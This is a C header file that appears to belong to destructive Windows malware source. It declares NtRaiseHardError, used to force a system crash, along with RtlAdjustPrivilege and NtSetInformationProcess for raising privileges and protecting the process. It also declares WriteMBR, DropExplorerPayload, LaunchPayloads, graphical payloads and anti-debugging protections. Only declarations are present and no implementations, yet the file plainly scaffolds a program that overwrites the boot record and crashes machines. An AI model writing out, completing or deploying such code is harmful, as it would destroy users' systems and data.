#pragma once
#include <Windows.h>

typedef enum HARDERROR_RESPONSE_OPTION {
	OptionAbortRetryIgnore,
	OptionOk,
	OptionOkCancel,
	OptionRetryCancel,
	OptionYesNo,
	OptionYesNoCancel,
	OptionShutdownSystem,
	OptionOkNoWait,
	OptionCancelTryContinue
} HARDERROR_RESPONSE_OPTION, *LPHARDERROR_RESPONSE_OPTION;

typedef NTSTATUS(*RtlAdjustPrivilegeDef) (ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef NTSTATUS(*NtSetInformationProcessDef) (HANDLE, PROCESS_INFORMATION_CLASS, PVOID, ULONG);
typedef NTSTATUS(*NtQueryInformationProcessDef) (HANDLE, PROCESS_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(*NtRaiseHardErrorDef) (DWORD dwError, DWORD dwParameterCount, LPVOID lpUnicodeStringParamMask, LPVOID *lpParams, HARDERROR_RESPONSE_OPTION dwHarderrorResponeOption, LPDWORD lpHarderrorResponse);

typedef struct {
	RtlAdjustPrivilegeDef RtlAdjustPrivilege;
	NtSetInformationProcessDef NtSetInformationProcess;
	NtQueryInformationProcessDef NtQueryInformationProcess;
	NtRaiseHardErrorDef NtRaiseHardError;
} DLLSTRUCT, *LPDLLSTRUCT;

EXTERN_C LPVOID CDECL lmemset(LPVOID dest, BYTE value, SIZE_T len);
EXTERN_C LPVOID CDECL lmemcpy(LPVOID dest, LPVOID src, SIZE_T len);
EXTERN_C LPVOID CDECL lmalloc(DWORD size);
EXTERN_C LPVOID CDECL lcalloc(DWORD size);
EXTERN_C LPVOID CDECL lfree(LPVOID mem);
EXTERN_C LPWSTR CDECL GenerateRandomNumericWString(DWORD dwLength);
EXTERN_C DWORD xorshift();
EXTERN_C DWORD CDECL TextOutQ(HDC hDC, DWORD dwX, DWORD dwY, LPCWSTR lpMessage);
EXTERN_C VOID seedxorshift(DWORD _seed);
EXTERN_C HANDLE mkthreadp(LPTHREAD_START_ROUTINE lpFunction, DWORD dwStartSuspended, LPVOID lpParam);
EXTERN_C HANDLE mkthread(LPTHREAD_START_ROUTINE lpFunction, DWORD dwStartSuspended);
EXTERN_C VOID MakeBorderless(HWND hWindow);
EXTERN_C LONG MakeTransparrent(HWND hWindow);
EXTERN_C HWND MakeWindow(RECT Dimensions, LPCWSTR lpName);
EXTERN_C _inline RECT GetScreenSize();
EXTERN_C DWORD LookupProcessByName(LPCWSTR lpProcessName);

EXTERN_C HANDLE EnableAllP15Protections(LPDLLSTRUCT dll);

EXTERN_C VOID LaunchPayloads(LPDLLSTRUCT dll, SYSTEMTIME systime, HANDLE antidbg);

EXTERN_C DWORD CDECL DropExplorerPayload(LPCWSTR lpPath);
EXTERN_C BOOLEAN WriteMBR();

EXTERN_C VOID LaunchGraphicalPayloads(SYSTEMTIME systime);